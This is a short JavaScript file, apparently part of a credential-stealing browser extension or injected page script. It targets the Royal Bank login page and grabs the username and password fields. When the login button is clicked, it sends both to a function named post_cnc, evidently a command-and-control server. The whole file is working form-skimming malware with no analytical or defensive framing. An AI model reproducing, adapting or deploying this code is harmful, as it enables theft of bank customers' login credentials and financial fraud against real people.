function get_pass(){
	try {
		let inputs = document.getElementsByTagName('input');
		for (let i = 0; i < inputs.length; i++){
			if (inputs[i].type == 'password'){
				return inputs[i].value;
			}
		}
		return false;
	} catch(error){
		console.log(error);
		return false;
	}
}

function get_user(){
	try {
		return document.getElementsByClassName('ccUsername')[0].value;
	} catch(error){
		console.log(error);
		return false;
	}
}

function get_user_pass(){
	try {
		let data = {
			"auth": {
				site: "royalbank.com",
				user: get_user(),
				pass: get_pass(),
				timestamp: Date.now()
			}
		};
		return data;
	} catch(error){
		console.log(error);
		return false;
	}
}

document.getElementsByClassName('yellowBtnLarge')[0].addEventListener(
	'click',
	function(){
		post_cnc(
			get_user_pass(),
			function(data){
				console.log(data);
				return true;
			}
		);
		return true;
	}
);